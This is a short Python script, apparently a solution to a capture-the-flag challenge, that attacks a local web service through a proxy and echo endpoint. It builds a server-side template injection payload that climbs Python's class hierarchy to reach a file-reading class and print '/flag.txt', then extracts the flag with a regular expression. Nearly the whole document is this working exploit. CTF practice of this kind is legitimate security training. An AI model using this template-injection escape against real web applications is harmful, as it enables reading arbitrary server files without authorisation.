import requests
import re

# need to host a file/page with `{{config}}` somewhere internet accessible and simply request it
if __name__ == "__main__":
    url = "http://localhost:3817/"
    # adds }} at the start to be stripped to build a valid {{ starting bracket, adds {% at the end to build a }} to close it
    payload = "{}}{'abc'.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('/flag.txt').read()}{%}"
    r = requests.get(f"{url}proxy?url={url}echo?data={payload}")
    flag_regex = re.compile(r"oiccflag{[a-zA-Z0-9_]+}")
    print(flag_regex.findall(r.text)[0])